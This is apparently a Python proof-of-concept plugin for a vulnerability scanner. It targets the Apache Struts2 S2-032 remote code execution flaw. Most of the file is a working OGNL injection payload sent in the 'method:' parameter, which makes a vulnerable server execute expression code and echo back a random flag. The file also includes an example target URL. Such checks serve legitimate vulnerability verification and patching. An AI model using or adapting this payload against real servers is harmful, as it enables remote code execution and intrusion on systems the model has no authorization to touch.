#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
struts2_s2_032.py
~~~~~~~~~
This script is to verify vuln `S2-032`
"""

import hashlib
import logging
import random
import string
import types

import requests
from poc.poc_base import POCBase
from poc.poc_base import Output


def get_md5(pre_md5):
    """generate md5 for a string

    对字符串进行MD5处理.

    Args:
        pre_md5(str): 传入待处理的字符串
    Returns:
        返回 传入字符串MD5值的字符串
        若传入的参数不是字符串则返回空字符串
    """
    if type(pre_md5) is types.StringType:
        m = hashlib.md5()
        m.update(pre_md5)
        return m.hexdigest()
    else:
        return ''


def get_random_str(length=10):
    """generate random string.

    生成随机字符串

    Args:
        length(int):length of random string you seek

    Returns:
        a random string
    """
    chars = string.ascii_letters + string.digits
    return ''.join(random.sample(chars, length))


class PocRealizeClass(POCBase):
    CHvulID = '00001'
    name = 'Struts2 远程代码执行漏洞(S2-032)'
    version = '1.0'
    author = ['miscentity']
    vulDate = ''
    createDate = '2016-12-21'
    updateDate = ''

    references = [
        'http://struts.apache.org/docs/s2-032.html']
    vulType = 'Code Execution'
    componentsName = 'Apache Struts'
    componentsVersion = 'Struts 2.3.20 - Struts Struts 2.3.28 (except 2.3.20.3 and 2.3.24.3)'
    componentsPowerLink = 'http://struts.apache.org/'
    samples = ['S2-032 docker']
    requirements = ['requests']
    desc = '''S2-032'''
    memo = ''''''

    def _verify(self):
        result = {}
        res = []
        flag_to_verify = get_md5(get_random_str(10))

        payload = 'method:%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%2C%23test%3D%23context.get%28%23parameters.res%5B0%5D%29.getWriter%28%29%2C%23test.println%28%23parameters.command%5B0%5D%29%2C%23test.flush%28%29%2C%23test.close&res=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command={0}'.format(
            flag_to_verify)
        url = "%s?%s" % (self.url, payload)
        response = requests.get(url, timeout=30, verify=False)
        if len(response.content) == 33:
            res.append(self.url)
            result['res'] = res
            result['payload'] = payload
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


if __name__ == '__main__':
    poc = PocRealizeClass()
    res = poc.execute(target='http://10.0.0.100/memoshow.action')
    #print res.status
    print res.show_result()


